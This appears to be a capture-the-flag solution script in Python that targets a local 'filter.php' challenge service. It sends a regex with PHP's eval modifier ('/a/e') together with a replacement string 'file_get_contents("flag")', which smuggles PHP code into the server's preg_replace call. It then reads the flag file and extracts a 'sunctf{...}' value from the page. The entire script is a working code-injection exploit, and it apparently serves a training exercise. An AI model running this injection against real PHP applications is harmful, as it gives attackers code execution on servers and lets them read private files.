import requests
import re
from urllib.parse import quote

URL1 = f"http://localhost:5004/filter.php"
URL2 = "http://localhost:5004"

requests.post(URL1, data={'match': '/a/e', 'replace': 'file_get_contents("flag")'})
r = requests.get(URL2)

if r.status_code == 200:
    match = re.search(r'sunctf{.*?}', r.text)
    print(match.group())
